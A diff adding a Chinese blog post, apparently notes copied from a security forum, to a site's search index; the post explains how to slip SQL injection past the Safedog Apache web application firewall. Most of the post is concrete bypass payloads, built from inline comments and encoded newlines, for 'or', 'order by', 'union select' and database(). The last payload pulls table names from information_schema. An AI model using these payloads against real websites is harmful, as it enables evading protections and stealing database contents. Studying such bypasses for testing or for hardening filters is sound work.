@@ -2466,4 +2466,30 @@ echo 123;
         <tag>FastJson</tag>
       </tags>
   </entry>
+  <entry>
+    <title>SQL注入过狗V4.0.2313</title>
+    <url>/2022/04/16/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E7%8B%97V4-0-2313/</url>
+    <content><![CDATA[<h1 id="SQL注入过安全狗-Apache版-V4-0-2323"><a href="#SQL注入过安全狗-Apache版-V4-0-2323" class="headerlink" title="SQL注入过安全狗 Apache版 V4.0.2323"></a>SQL注入过安全狗 Apache版 V4.0.2323</h1><h2 id="摘抄https-zone-huoxian-cn-d-1069-sqlbypass"><a href="#摘抄https-zone-huoxian-cn-d-1069-sqlbypass" class="headerlink" title="摘抄https://zone.huoxian.cn/d/1069-sqlbypass"></a>摘抄<a href="https://zone.huoxian.cn/d/1069-sqlbypass">https://zone.huoxian.cn/d/1069-sqlbypass</a></h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>内联注释的基本语法如下，内联注释是为了方便在不同版本的Mysql中运行语句而成立的<span id="more"></span>。</p>
+<p><code>/*!       */</code></p>
+<p>当我们再<code>!</code>后直接写sql语句时，当前sql语句会被正常执行。</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416194900.png"></p>
+<p>但是如果在<code>!</code>后接入数字，代表当前Mysql版本。如果当前版本小于数字版本则语句不会运行。比如当前版本为<code>5.05.53</code>那如果输入<code>select /*!50554@@version*/</code>则 <code>@@version</code>相当于被注释。</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220416195010.png"></p>
+<h3 id="绕过or"><a href="#绕过or" class="headerlink" title="绕过or"></a>绕过or</h3><p>id=1’ or 1 –+ // 过滤<br>id=1’ or /<em>/</em>/ 1 //不过滤<br>?id=1’ or /*/**/ 1=1  –+ //不过滤</p>
+<p>通过 or /*/**/ 1=1 绕过  <code>or 1=1</code></p>
+<h3 id="绕过-order-by"><a href="#绕过-order-by" class="headerlink" title="绕过 order by"></a>绕过 order by</h3><p>通过 <code>order/*/**/by</code>绕过 <code>order by</code></p>
+<h3 id="绕过-union-select"><a href="#绕过-union-select" class="headerlink" title="绕过 union select"></a>绕过 union select</h3><p><code>?id=1&#39;  union%23%0a%23%0a%23%0aselect</code> </p>
+<h3 id="绕过-database"><a href="#绕过-database" class="headerlink" title="绕过 database()"></a>绕过 database()</h3><p>使用 %23%0a和内联注释将两个()分隔</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1&#x27; union%23%0a%23%0a%23%0aselect 1,database/*!(*//*!%23%0a)*/ -- + //不拦截</span><br><span class="line">name=1&#x27; union%23%0a%23%0a%23%0aselect 1,database/*!(*/%23%0a/*!)*/ -- +  //不拦截</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过select-infomation-schema"><a href="#绕过select-infomation-schema" class="headerlink" title="绕过select *** infomation_schema"></a>绕过select *** infomation_schema</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union%23%0a%23%0a%23%0aselect 1,group_concat(table_name) , 3  from/*!/*REGEXP &quot;[…%0a%23]&quot;*/%0ainformation_schema.tables*//*/**/  where table_schema=&#x27;security&#x27;-- +</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WAF</category>
+      </categories>
+      <tags>
+        <tag>Sql注入</tag>
+        <tag>安全狗</tag>
+      </tags>
+  </entry>
 </search>
